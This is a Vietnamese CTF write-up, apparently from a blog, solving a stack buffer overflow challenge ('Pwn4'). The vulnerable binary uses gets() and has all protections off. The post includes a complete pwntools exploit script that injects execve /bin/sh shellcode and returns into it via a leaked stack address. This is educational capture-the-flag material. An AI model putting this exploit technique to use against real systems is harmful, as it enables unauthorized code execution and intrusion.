---
title: "Pwn4-MiniCTF-PTITHCM"
date: 2024-01-06 00:00:00 +0700
categories: [CTF, Binary Exploitation]
tags: [pwn, shellcode, gets, stack-overflow, ptithcm]
author: datious
---
# Pwn4- MiniCTF-PTITHCM
*Author: D1n0_09-N24DCAT015*
Đầu tiên khi tải về ta sẽ có 1 file pwn4.rar => Giải nén nó thì ta nhận được các file sau
![image](https://hackmd.io/_uploads/rJgQWTggbx.png)
* Tạo môi trường - Dùng tool pwinit để tạo file patched giữa file binary và file libc do bài cung cấp.
1.  Bước đầu tiên ta dùng gdb check thử các lớp bảo mật ma chương trình có 
![image](https://hackmd.io/_uploads/By9tVaelWe.png)

- Tất cả các lớp bảo mật đều tắt. Tiếp theo ta mở source code để tìm lỗ hổng. Dùng tool ghidra để decompile.
```
int main(void)

{
  char buf [32];
  
  dump_stack();
  printf("Input: ");
  gets(buf);
  printf("Output: ");
  printf(buf);
  putchar(10);
  dump_stack();
  return 0;
}
```
- Đây là hàm main của chuong trình. Lỗi ở đây là hàm gets() cho nhập không giới hạn trong khi kích thươc của biến buf là 32 => buffer overflow.
=> Qua đây em quyết định sử dụng shellcode để return vào nó thông qua việc ghi đè save rip nhằm điều khiển chương trình.
//shellcode
2. Khai thác 
- Đầu tiên phải xác nhận offset từ biến buf tới save rip
- Vì đây là cấu trúc 64bit nên mỗi thanh ghi gồm 8 bytes.
=> Nhập thử với buf có độ lớn 48 bytes

![image](https://hackmd.io/_uploads/SJjLdTgeWl.png)
- Từ đây ta có biết được offset=40
- Ngoài ra khi run chuong trình còn cung cấp địa chỉ của biến buf như này
```
Starting program: /home/kali/Downloads/pwn4/chall_patched 
warning: Expected absolute pathname for libpthread in the inferior, but got ./libc.so.6.
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
0x7fffffffdc50: 0000000000000000 <- rsp
0x7fffffffdc58: 00007ffff7e354e0 
0x7fffffffdc60: 00007fffffffdca0 
0x7fffffffdc68: 00007ffff7c9d451 
0x7fffffffdc70: 00007fffffffdd10 <- rbp
0x7fffffffdc78: 00007ffff7c2a575 
Input: 

```
- Đây là mấu chốt quan trọng để ta return vào shellcode. Nhận địa chỉ của stack nhằm nhảy vô đó.
3. Viết script khai thác.
```
  GNU nano 8.6                                                              solve.py                                                                        
#!/usr/bin/python3
from pwn import *
exe=ELF('./chall_patched',checksec=False)
p=process(exe.path)

leak=int(p.recv(14),16)
log.info("leak: "+hex(leak))
offset=40
shellcode=asm('''
mov rdi,29400045130965551
push rdi   
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx 
mov rax,0x3b
syscall
''',arch='amd64')
payload=shellcode  
payload=payload.ljust(40)
payload+=p64(leak) 
p.sendline(payload)
p.interactive()

```
* Thử local 
![image](https://hackmd.io/_uploads/HJH65plxZg.png)
- Done!
- Thay đổi p=remote(HOST,PORT) lấy flag!

